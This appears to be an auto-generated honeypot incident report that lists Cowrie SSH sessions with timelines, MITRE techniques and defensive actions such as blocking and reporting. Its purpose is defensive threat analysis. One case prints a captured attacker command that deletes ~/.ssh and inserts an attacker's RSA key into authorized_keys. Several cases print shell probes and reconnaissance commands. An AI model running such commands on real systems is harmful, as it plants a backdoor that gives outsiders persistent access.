| `2026-11-26 00:30:09` | `cowrie.session.params` |
| `2026-11-26 00:30:09` | `cowrie.command.input` |
| `2026-11-26 00:30:10` | `cowrie.session.file_download` |
| `2026-11-26 00:30:10` | `cowrie.log.closed` |
| `2026-11-26 00:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac35b698a031

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-11-26 00:30 |
| **Last Seen** | 2026-11-26 00:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:30:10` | `cowrie.session.connect` |
| `2026-11-26 00:30:10` | `cowrie.client.version` |
| `2026-11-26 00:30:10` | `cowrie.client.kex` |
| `2026-11-26 00:30:11` | `cowrie.login.success` |
| `2026-11-26 00:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7242bed221cd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-26 00:39 |
| **Last Seen** | 2026-11-26 00:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 00:39:57` | `cowrie.session.connect` |
| `2026-11-26 00:39:57` | `cowrie.client.version` |
| `2026-11-26 00:39:57` | `cowrie.client.kex` |
| `2026-11-26 00:39:57` | `cowrie.login.success` |
| `2026-11-26 00:39:57` | `cowrie.direct-tcpip.request` |
| `2026-11-26 00:39:58` | `cowrie.direct-tcpip.data` |
| `2026-11-26 00:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b826d816ed30

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-11-26 01:03 |
| **Last Seen** | 2026-11-26 01:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 01:03:28` | `cowrie.session.connect` |
| `2026-11-26 01:03:28` | `cowrie.client.version` |
| `2026-11-26 01:03:28` | `cowrie.client.kex` |
| `2026-11-26 01:03:29` | `cowrie.login.success` |
| `2026-11-26 01:03:29` | `cowrie.direct-tcpip.request` |
| `2026-11-26 01:03:29` | `cowrie.direct-tcpip.ja4` |
| `2026-11-26 01:03:29` | `cowrie.direct-tcpip.data` |
| `2026-11-26 01:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb80a4e26d68

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-11-26 01:03 |
| **Last Seen** | 2026-11-26 01:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 01:03:36` | `cowrie.session.connect` |
| `2026-11-26 01:03:36` | `cowrie.client.version` |
| `2026-11-26 01:03:36` | `cowrie.client.kex` |
| `2026-11-26 01:03:36` | `cowrie.login.success` |
| `2026-11-26 01:03:37` | `cowrie.direct-tcpip.request` |
| `2026-11-26 01:03:37` | `cowrie.direct-tcpip.ja4` |
| `2026-11-26 01:03:37` | `cowrie.direct-tcpip.data` |
| `2026-11-26 01:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d899c9c7272

| Field | Detail |
|---|---|
| **Source IP** | `72.240.125[.]133` |
| **First Seen** | 2026-11-26 01:06 |
| **Last Seen** | 2026-11-26 01:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 01:06:52` | `cowrie.session.connect` |
| `2026-11-26 01:06:52` | `cowrie.client.version` |
| `2026-11-26 01:06:52` | `cowrie.client.kex` |
| `2026-11-26 01:06:53` | `cowrie.login.success` |
| `2026-11-26 01:06:53` | `cowrie.session.params` |
| `2026-11-26 01:06:53` | `cowrie.command.input` |
| `2026-11-26 01:06:53` | `cowrie.command.failed` |
| `2026-11-26 01:06:53` | `cowrie.log.closed` |
| `2026-11-26 01:06:54` | `cowrie.session.params` |
| `2026-11-26 01:06:54` | `cowrie.command.input` |
| `2026-11-26 01:06:54` | `cowrie.session.file_download` |
| `2026-11-26 01:06:54` | `cowrie.log.closed` |
| `2026-11-26 01:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.240.125[.]133` to AbuseIPDB if not already reported
- [ ] Block `72.240.125[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a564c53a50

| Field | Detail |
|---|---|
| **Source IP** | `72.240.125[.]133` |
| **First Seen** | 2026-11-26 01:06 |
| **Last Seen** | 2026-11-26 01:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 01:06:54` | `cowrie.session.connect` |
| `2026-11-26 01:06:54` | `cowrie.client.version` |
| `2026-11-26 01:06:54` | `cowrie.client.kex` |
| `2026-11-26 01:06:54` | `cowrie.login.success` |
| `2026-11-26 01:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.240.125[.]133` to AbuseIPDB if not already reported
- [ ] Block `72.240.125[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7f1b8d8b8f4

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]124` |
| **First Seen** | 2026-11-26 01:15 |
| **Last Seen** | 2026-11-26 01:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 01:15:11` | `cowrie.session.connect` |
| `2026-11-26 01:15:11` | `cowrie.client.version` |
| `2026-11-26 01:15:12` | `cowrie.client.kex` |
| `2026-11-26 01:15:12` | `cowrie.login.success` |
| `2026-11-26 01:15:14` | `cowrie.session.params` |
| `2026-11-26 01:15:14` | `cowrie.command.input` |
| `2026-11-26 01:15:14` | `cowrie.log.closed` |
| `2026-11-26 01:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]124` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a57aa920e9ae

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-11-26 01:15 |
| **Last Seen** | 2026-11-26 01:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_687e7567d337424bc5f4e430d9fa9d24_small_control'"'"' '"'"'check_687e7567d337424bc5f4e430d9fa9d24'"'"'', printf '\n%s|%s\n' 'check_687e7567d337424bc5f4e430d9fa9d24_small_control' 'check_687e7567d337424bc5f4e430d9fa9d24', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_687e7567d337424bc5f4e430d9fa9d24_small_math'"'"' "$((829*326+76))"', (829*326+76, printf '\n%s|%s\n' 'check_687e7567d337424bc5f4e430d9fa9d24_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 01:15:55` | `cowrie.session.connect` |
| `2026-11-26 01:15:55` | `cowrie.client.version` |
| `2026-11-26 01:15:55` | `cowrie.client.kex` |
| `2026-11-26 01:15:57` | `cowrie.login.success` |
| `2026-11-26 01:15:59` | `cowrie.client.size` |
| `2026-11-26 01:15:59` | `cowrie.session.params` |
| `2026-11-26 01:15:59` | `cowrie.command.input` |
| `2026-11-26 01:15:59` | `cowrie.command.input` |
| `2026-11-26 01:15:59` | `cowrie.command.input` |
| `2026-11-26 01:15:59` | `cowrie.command.input` |
| `2026-11-26 01:15:59` | `cowrie.command.input` |
| `2026-11-26 01:15:59` | `cowrie.command.input` |
| `2026-11-26 01:15:59` | `cowrie.command.input` |
| `2026-11-26 01:15:59` | `cowrie.command.input` |
| `2026-11-26 01:15:59` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a539b8d8182

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-11-26 01:17 |
| **Last Seen** | 2026-11-26 01:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1da43d8a59300522c4b1ddd04f04e206_small_control'"'"' '"'"'check_1da43d8a59300522c4b1ddd04f04e206'"'"'', printf '\n%s|%s\n' 'check_1da43d8a59300522c4b1ddd04f04e206_small_control' 'check_1da43d8a59300522c4b1ddd04f04e206', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1da43d8a59300522c4b1ddd04f04e206_small_math'"'"' "$((610*890+23))"', (610*890+23, printf '\n%s|%s\n' 'check_1da43d8a59300522c4b1ddd04f04e206_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 01:17:26` | `cowrie.session.connect` |
| `2026-11-26 01:17:26` | `cowrie.client.version` |
| `2026-11-26 01:17:26` | `cowrie.client.kex` |
| `2026-11-26 01:17:29` | `cowrie.login.success` |
| `2026-11-26 01:17:30` | `cowrie.client.size` |
| `2026-11-26 01:17:31` | `cowrie.session.params` |
| `2026-11-26 01:17:31` | `cowrie.command.input` |
| `2026-11-26 01:17:31` | `cowrie.command.input` |
| `2026-11-26 01:17:31` | `cowrie.command.input` |
| `2026-11-26 01:17:31` | `cowrie.command.input` |
| `2026-11-26 01:17:31` | `cowrie.command.input` |
| `2026-11-26 01:17:31` | `cowrie.command.input` |
| `2026-11-26 01:17:31` | `cowrie.command.input` |
| `2026-11-26 01:17:31` | `cowrie.command.input` |
| `2026-11-26 01:17:31` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f7dd70f71ef

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-11-26 01:18 |
| **Last Seen** | 2026-11-26 01:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8d811af85879350ec69c3659496950da_small_control'"'"' '"'"'check_8d811af85879350ec69c3659496950da'"'"'', printf '\n%s|%s\n' 'check_8d811af85879350ec69c3659496950da_small_control' 'check_8d811af85879350ec69c3659496950da', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8d811af85879350ec69c3659496950da_small_math'"'"' "$((334*959+45))"', (334*959+45, printf '\n%s|%s\n' 'check_8d811af85879350ec69c3659496950da_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 01:18:56` | `cowrie.session.connect` |
| `2026-11-26 01:18:56` | `cowrie.client.version` |
| `2026-11-26 01:18:56` | `cowrie.client.kex` |
| `2026-11-26 01:18:58` | `cowrie.login.success` |
| `2026-11-26 01:19:01` | `cowrie.client.size` |
| `2026-11-26 01:19:01` | `cowrie.session.params` |
| `2026-11-26 01:19:02` | `cowrie.command.input` |
| `2026-11-26 01:19:02` | `cowrie.command.input` |
| `2026-11-26 01:19:02` | `cowrie.command.input` |
| `2026-11-26 01:19:02` | `cowrie.command.input` |
| `2026-11-26 01:19:02` | `cowrie.command.input` |
| `2026-11-26 01:19:02` | `cowrie.command.input` |
| `2026-11-26 01:19:02` | `cowrie.command.input` |
| `2026-11-26 01:19:02` | `cowrie.command.input` |
| `2026-11-26 01:19:02` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c66611bacfe4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-11-26 01:21 |
| **Last Seen** | 2026-11-26 01:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3eb95ef3b8f7bac5a47398a0a2c8892f_small_control'"'"' '"'"'check_3eb95ef3b8f7bac5a47398a0a2c8892f'"'"'', printf '\n%s|%s\n' 'check_3eb95ef3b8f7bac5a47398a0a2c8892f_small_control' 'check_3eb95ef3b8f7bac5a47398a0a2c8892f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3eb95ef3b8f7bac5a47398a0a2c8892f_small_math'"'"' "$((106*524+53))"', (106*524+53, printf '\n%s|%s\n' 'check_3eb95ef3b8f7bac5a47398a0a2c8892f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 01:21:52` | `cowrie.session.connect` |
| `2026-11-26 01:21:53` | `cowrie.client.version` |
| `2026-11-26 01:21:53` | `cowrie.client.kex` |
| `2026-11-26 01:21:55` | `cowrie.login.success` |
| `2026-11-26 01:21:56` | `cowrie.client.size` |
| `2026-11-26 01:21:57` | `cowrie.session.params` |
| `2026-11-26 01:21:57` | `cowrie.command.input` |
| `2026-11-26 01:21:57` | `cowrie.command.input` |
| `2026-11-26 01:21:57` | `cowrie.command.input` |
| `2026-11-26 01:21:57` | `cowrie.command.input` |
| `2026-11-26 01:21:57` | `cowrie.command.input` |
| `2026-11-26 01:21:57` | `cowrie.command.input` |
| `2026-11-26 01:21:57` | `cowrie.command.input` |
| `2026-11-26 01:21:57` | `cowrie.command.input` |
| `2026-11-26 01:21:57` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-273d1f7b98ea

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-11-26 01:23 |
| **Last Seen** | 2026-11-26 01:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_481ac64b8e88f0441a3afca5626f8107_small_control'"'"' '"'"'check_481ac64b8e88f0441a3afca5626f8107'"'"'', printf '\n%s|%s\n' 'check_481ac64b8e88f0441a3afca5626f8107_small_control' 'check_481ac64b8e88f0441a3afca5626f8107', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_481ac64b8e88f0441a3afca5626f8107_small_math'"'"' "$((513*223+29))"', (513*223+29, printf '\n%s|%s\n' 'check_481ac64b8e88f0441a3afca5626f8107_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 01:23:15` | `cowrie.session.connect` |
| `2026-11-26 01:23:16` | `cowrie.client.version` |
| `2026-11-26 01:23:16` | `cowrie.client.kex` |
| `2026-11-26 01:23:18` | `cowrie.login.success` |
| `2026-11-26 01:23:19` | `cowrie.client.size` |
| `2026-11-26 01:23:19` | `cowrie.session.params` |
| `2026-11-26 01:23:20` | `cowrie.command.input` |
| `2026-11-26 01:23:20` | `cowrie.command.input` |
| `2026-11-26 01:23:20` | `cowrie.command.input` |
| `2026-11-26 01:23:20` | `cowrie.command.input` |
| `2026-11-26 01:23:20` | `cowrie.command.input` |
| `2026-11-26 01:23:20` | `cowrie.command.input` |
| `2026-11-26 01:23:20` | `cowrie.command.input` |
| `2026-11-26 01:23:20` | `cowrie.command.input` |
| `2026-11-26 01:23:20` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (113) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-30443a27628c | HIGH | `195.178.110[.]227` | 2026-11-26 01:24 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0227ef95055a | HIGH | `195.178.110[.]227` | 2026-11-26 01:26 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-59579f717203 | HIGH | `195.178.110[.]227` | 2026-11-26 01:27 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f2c20629e2bb | HIGH | `195.178.110[.]227` | 2026-11-26 01:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-982403fec52a | HIGH | `195.178.110[.]227` | 2026-11-26 01:31 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-95c133b45df4 | HIGH | `195.178.110[.]227` | 2026-11-26 01:32 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-37bba70b0fbd | HIGH | `195.178.110[.]227` | 2026-11-26 01:34 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c64e6101ba7d | HIGH | `195.178.110[.]227` | 2026-11-26 01:35 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bc86791cf266 | HIGH | `195.178.110[.]227` | 2026-11-26 01:37 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3df98bcf5f52 | HIGH | `195.178.110[.]227` | 2026-11-26 01:39 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7660e9f16ac9 | HIGH | `195.178.110[.]227` | 2026-11-26 01:40 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b1c05b705bbc | HIGH | `195.178.110[.]227` | 2026-11-26 01:42 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-08217be0e467 | HIGH | `195.178.110[.]227` | 2026-11-26 01:43 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8c07eeae5b3a | HIGH | `195.178.110[.]227` | 2026-11-26 01:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e6bf4166c44d | HIGH | `195.178.110[.]227` | 2026-11-26 01:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9fa7c0b3e821 | HIGH | `20.127.185[.]37` | 2026-11-26 01:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-24a6193f97be | HIGH | `20.127.185[.]37` | 2026-11-26 01:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-638e7719159c | HIGH | `45.65.233[.]18` | 2026-11-26 01:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f1fc9b2c1558 | HIGH | `45.65.233[.]18` | 2026-11-26 01:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-89228f52ef47 | HIGH | `195.178.110[.]227` | 2026-11-26 01:48 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bba834ccdc68 | HIGH | `195.178.110[.]227` | 2026-11-26 01:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3619fa073549 | HIGH | `195.178.110[.]227` | 2026-11-26 01:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4647f669f019 | HIGH | `195.178.110[.]227` | 2026-11-26 01:53 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7f2171b8ab04 | HIGH | `195.178.110[.]227` | 2026-11-26 01:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7c83e7a5cd1d | HIGH | `195.178.110[.]227` | 2026-11-26 01:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-39b8a546d797 | HIGH | `195.178.110[.]227` | 2026-11-26 01:57 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-08fd6c578261 | HIGH | `195.178.110[.]227` | 2026-11-26 01:59 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-70ea0af7cbfa | HIGH | `109.160.32[.]124` | 2026-11-26 02:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-3152bf2df3bf | HIGH | `195.178.110[.]227` | 2026-11-26 02:00 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d237ab1e0525 | HIGH | `195.178.110[.]227` | 2026-11-26 02:02 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ee539b2649c0 | HIGH | `195.178.110[.]227` | 2026-11-26 02:03 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c856be5eb154 | HIGH | `138.124.124[.]212` | 2026-11-26 02:04 | Y | 4 | 0 | `T1078` |
| IR-d48a7a696df9 | HIGH | `195.178.110[.]227` | 2026-11-26 02:05 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5a7d94963ace | HIGH | `195.178.110[.]227` | 2026-11-26 02:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ce9e1e6da647 | HIGH | `176.53.159[.]196` | 2026-11-26 02:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2a58d07ec255 | HIGH | `195.178.110[.]227` | 2026-11-26 02:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ce9e280ffc7a | HIGH | `195.178.110[.]227` | 2026-11-26 02:09 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d17134ff3929 | HIGH | `195.178.110[.]227` | 2026-11-26 02:10 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-95ac17235055 | HIGH | `195.178.110[.]227` | 2026-11-26 02:12 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1fa0a72ef8c3 | HIGH | `195.178.110[.]227` | 2026-11-26 02:13 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c209b13e9e0e | HIGH | `195.178.110[.]227` | 2026-11-26 02:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e587629f59a4 | HIGH | `195.178.110[.]227` | 2026-11-26 02:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3ecc98f1b5b9 | HIGH | `195.178.110[.]227` | 2026-11-26 02:17 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-884f0bc7fa68 | HIGH | `65.49.20[.]69` | 2026-11-26 02:18 | Y | 3 | 0 | `T1078` |
| IR-72ca3774cc16 | HIGH | `195.178.110[.]227` | 2026-11-26 02:19 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-2a7cb44ebde4 | HIGH | `138.124.124[.]210` | 2026-11-26 02:20 | Y | 0 | 0 | `T1078` |
| IR-90826bee193b | HIGH | `195.178.110[.]227` | 2026-11-26 02:20 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3e84ecc50487 | HIGH | `195.178.110[.]227` | 2026-11-26 02:22 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-096435768243 | HIGH | `195.178.110[.]227` | 2026-11-26 02:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c604474ef727 | HIGH | `195.178.110[.]227` | 2026-11-26 02:25 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1028b74778eb | HIGH | `195.178.110[.]227` | 2026-11-26 02:26 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e817840ff2bb | HIGH | `195.178.110[.]227` | 2026-11-26 02:28 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4ff35bfd3712 | HIGH | `138.124.116[.]194` | 2026-11-26 02:28 | Y | 0 | 0 | `T1078` |
| IR-f77fea840acc | HIGH | `195.178.110[.]227` | 2026-11-26 02:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5b81680c2a71 | HIGH | `212.64.201[.]210` | 2026-11-26 02:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-998eb5c0e57d | HIGH | `212.64.201[.]210` | 2026-11-26 02:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8b27e596db5a | HIGH | `4.240.126[.]25` | 2026-11-26 02:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7db1233e6060 | HIGH | `4.240.126[.]25` | 2026-11-26 02:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7fa5ebf26d46 | HIGH | `172.172.170[.]199` | 2026-11-26 02:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-68dcd0332b6a | HIGH | `172.172.170[.]199` | 2026-11-26 02:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-63a6a792fe62 | HIGH | `78.128.112[.]74` | 2026-11-26 02:43 | Y | 1 | 0 | `T1078 · T1592` |
